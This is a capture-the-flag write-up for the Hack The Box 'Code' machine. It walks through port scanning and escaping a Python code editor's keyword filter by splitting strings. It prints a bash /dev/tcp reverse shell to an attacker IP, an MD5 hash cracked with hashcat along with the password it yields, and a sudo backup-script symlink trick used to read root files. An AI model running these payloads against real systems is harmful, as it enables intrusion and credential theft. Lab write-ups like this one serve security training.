
## Code

You can find the machine [here](https://app.hackthebox.com/machines/Code).
During all this writeup, I'll be using the variable `$TARGET_IP` as the machine IP address, and `$ATTACKER_IP` as the attacker IP address (us).

## Step 1 - Recognition

First of all, we will do some recognition using nmap without any flags to quickly find out which ports are open :
```bash
$ nmap $TARGET_IP
Starting Nmap 7.93 ( https://nmap.org ) at 2025-07-22 05:06 CEST
Nmap scan report for $TARGET_IP
Host is up (0.031s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp

Nmap done: 1 IP address (1 host up) scanned in 0.69 seconds
```

2 ports are open :
- 22 (ssh)
- 5000 (unknown)

Let's focus on the port 5000 :
```bash
$ nmap $TARGET_IP -p5000 -sC -sV
Starting Nmap 7.93 ( https://nmap.org ) at 2025-07-22 05:07 CEST
Nmap scan report for $TARGET_IP
Host is up (0.028s latency).

PORT     STATE SERVICE VERSION
5000/tcp open  http    Gunicorn 20.0.4
|_http-title: Python Code Editor
|_http-server-header: gunicorn/20.0.4

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.40 seconds
```

It looks like a HTTP server. Let's see the content of this website :
![[screenshot_1.png]]

We can run python code in here. Let's try to cook a payload to run a reverse-shell.

## Reverse-shell

We can first try to make a basic reverse-shell by importing the module "os" :
![[screenshot_2.png]]

Looks like we can't import the os module... Let's try with another simple module :
![[screenshot_3.png]]

We can't import any module. Let's try to import them using the `__import__` builtin function :
![[screenshot_4.png]]

It still fail. Let's try a little python trick. We will use the `globals()` function to get all the global symbol table, which contains the `__import__` function in the `__builtins__` table :
![[screenshot_5.png]]

It still detect the `import` keyword, except if we split the word into 2 strings :
![[screenshot_6.png]]

Perfect ! Let's make a reverse-shell using this. To bypass all banned words, we will use the module "subprocess" which can run bash commands using the `check_output` function :
```
module = globals()["__buil" + "tins__"]["__im" + "port__"]("sub" + "process")

output = module.check_output("bash -c 'bash -i >& /dev/tcp/$ATTACKER_IP/9001 0>&1'", shell=True)
print(output)
```

You can probably also use the `os.system` function to run the reverse-shell.

Using this, we got a reverse-shell as "app-production" :
```bash
$ whoami
app-production
```

## Flag user.txt

By now, we can directly get the user.txt flag :
```bash
$ cat ~/user.txt
...
```

## Flag root.txt

To find the root flag, we will have to search in the app folder, where a database.db file is available :
```bash
$ cd app/instance/
$ ls
database.db
```

By opening this file in the SQL Viewer Online website, we can select all the users and find the user Martin, which is also a user on the machine :
![[screenshot_7.png]]

We can crack his password using hashcat :
```bash
$ hashcat -a 0 -m 0 martin_hash_pass /opt/rockyou.txt

...

Dictionary cache hit:
* Filename..: /opt/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

3de6f30c4a09c27fc71932bfc68474be:nafeelswordsmaster       
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 3de6f30c4a09c27fc71932bfc68474be
Time.Started.....: Tue Jul 22 05:37:50 2025 (1 sec)
Time.Estimated...: Tue Jul 22 05:37:51 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/opt/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  8025.0 kH/s (0.29ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 5234688/14344384 (36.49%)
Rejected.........: 0/5234688 (0.00%)
Restore.Point....: 5222400/14344384 (36.41%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: nairb234 -> nabete
Hardware.Mon.#1..: Temp: 55c Util: 10%

Started: Tue Jul 22 05:37:40 2025
```

The password of martin is successfully cracked : `nafeelswordsmaster`
We can now log in as martin :
```bash
$ su martin
password: nafeelswordsmaster
$ whoami
martin
```

When logged in as martin, we can see that he can execute a specific command as sudo, without password :
```bash
$ sudo -l
Matching Defaults entries for martin on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User martin may run the following commands on localhost:
    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
```

Let's try to understand this script :
```bash
$ cat  /usr/bin/backy.sh
#!/bin/bash

if [[ $# -ne 1 ]]; then
    /usr/bin/echo "Usage: $0 <task.json>"
    exit 1
fi

json_file="$1"

...

/usr/bin/backy "$json_file"
```

It uses the command backy to make a backup of some directories with a configuration file "task.json". We can find a valid task.json file in his home directory :
```bash
$ cat ~/backups/task.json

{
        "destination": "/home/martin/backups/",
        "multiprocessing": true,
        "verbose_log": false,
        "directories_to_archive": [
                "/home/app-production/app"
        ],

        "exclude": [
                ".*"
        ]
}
```

We can specify a directory to archive and the destination folder of the archive.
If we take a look at the script, we can see two important rules :
1. We can only archive directories from `/var` or `/home`.
2. We cannot use the `../` syntax to go to the parent folder.
```bash
allowed_paths=("/var/" "/home/")

updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")
```

We can try to make a symlink of the root of the machine and archive the `root` folder from this symlink :
```bash
$ ln -s / root_machine
$ cat task.json 
{
        "destination": "/home/martin/backups/",
        "multiprocessing": true,
        "verbose_log": false,
        "directories_to_archive": [
                "/home/martin/backups/root_machine/root"
        ],

        "exclude": [
                ".*"
        ]
}
```

Then we can run the script using sudo :
```bash
$ sudo /usr/bin/backy.sh task.json 
2025/07/22 03:47:49 🍀 backy 1.2
2025/07/22 03:47:49 📋 Working with task.json ...
2025/07/22 03:47:49 💤 Nothing to sync
2025/07/22 03:47:49 📤 Archiving: [/home/martin/backups/root_machine/root]
2025/07/22 03:47:49 📥 To: /home/martin/backups ...
2025/07/22 03:47:49 📦
```

It works ! Let's see if the archive contains the root flag by unarchiving it :
```bash
$ tar -xvf code_home_martin_backups_root_machine_root_2025_July.tar.bz2 
home/martin/backups/root_machine/root/
home/martin/backups/root_machine/root/scripts/
home/martin/backups/root_machine/root/scripts/cleanup.sh
home/martin/backups/root_machine/root/scripts/backups/
home/martin/backups/root_machine/root/scripts/backups/task.json
home/martin/backups/root_machine/root/scripts/backups/code_home_app-production_app_2024_August.tar.bz2
home/martin/backups/root_machine/root/scripts/database.db
home/martin/backups/root_machine/root/scripts/cleanup2.sh
home/martin/backups/root_machine/root/root.txt
$ cat home/martin/backups/root_machine/root/root.txt
...
```

And we finally rooted the machine, congrats ! :D